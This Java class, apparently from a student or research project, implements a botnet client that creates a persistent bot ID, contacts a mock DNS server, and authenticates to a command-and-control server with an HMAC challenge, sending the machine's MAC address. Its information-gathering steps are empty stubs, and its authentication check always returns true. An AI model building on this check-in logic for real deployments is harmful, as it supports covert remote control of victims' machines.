package cs.sii.bot.passive;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import cs.sii.bot.active.CryptoAuth;
import cs.sii.config.bot.Engine;
import cs.sii.connection.AsyncRequest;
import cs.sii.connection.NetworkService;
import cs.sii.domain.Conversions;
import cs.sii.domain.FileUtil;
import cs.sii.domain.Pairs;
import javassist.bytecode.ByteArray;
import javassist.compiler.SymbolTable;

@Service
public class Bot {

	@Autowired
	private Engine engineBot;

	@Autowired
	private NetworkService networkService;

	@Autowired
	private AsyncRequest request;

	@Autowired
	private CryptoAuth auth;

	@Autowired
	private FileUtil fileUtil;

	public Bot() {
	}

	public void initializeBot() throws IOException {

		String idBot=fileUtil.decodeFromFile();
		if (idBot.equals("")){
			ArrayList<Object> data = new ArrayList<Object>();
			data.add(networkService.generateID());
			fileUtil.encodeToFile(data);
		}
			
		if (!engineBot.isCommandandconquerStatus()) {

			// metter controllo ID se ==NULL genera altrimenti riusa
			// TODO salvare ID su properties

			// inserire id univoco nella richiesta
			networkService.firstConnectToMockServerDns();
			// reinserire id univoco nella richiesta
			if (challengeToCommandConquer()) {
				// push info online os
				System.out.println("Bot is Ready");
			} else
				System.out.println("Bot not Ready, authentication failed");
			
		}
		
		
		
	}

	public void getInfo() {

		//TODO prendi info sistema

		//TODO pusha online info

	}

	private boolean challengeToCommandConquer() {
		//
		System.out.println(networkService.getCommandConquerIps().getIPList().get(0));

		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),
				networkService.getCommandConquerIps().getIPList().get(0));

		if (challenge != null) {

			String key = auth.generateStringKey(challenge.getValue2());
			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
			System.out.println(hashMac);
			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(),networkService.getMac(),networkService.getCommandConquerIps().getIPList().get(0), challenge.getValue1(),challenge.getValue2(), hashMac);
			System.out.println("La risposta del CeC: " + response);

		}

		return true;
	}

}
